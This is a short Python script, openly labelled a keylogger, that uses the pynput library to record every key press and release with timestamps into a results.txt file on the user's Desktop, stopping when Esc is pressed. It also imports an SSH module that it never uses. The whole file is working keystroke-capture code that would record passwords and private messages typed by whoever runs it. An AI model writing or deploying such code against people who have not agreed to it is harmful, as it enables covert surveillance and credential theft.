import logging
import os
from pexpect import pxssh
from threading import Thread
from pynput.keyboard import Key, Listener as KeyboardListener


#Specify the dir and file of the log file
directory = os.path.join(os.path.expanduser("~"), "Desktop")
filename = "results.txt"
path = os.path.join (directory, filename)

#configure Logging
logging.basicConfig(
    filename = path,
    level = logging.INFO,
    format = "%(asctime)s - %(message)s" 
)

def press(key):
    logging.info(f'Key pressed: {key}')

def release(key):
    logging.info(f'Key released: {key}')
    if key == Key.esc:
        return False

def start_listener():
    with KeyboardListener(on_press=press, on_release=release) as listener:
        listener.join() #it keeps the listener is properly started and stopped

keyboard_thread = Thread(target=start_listener)#thread for keyboard

keyboard_thread.start()#starting thread

keyboard_thread.join() #wating threads

print(f'[+] Keylogger, results saved on: {path}')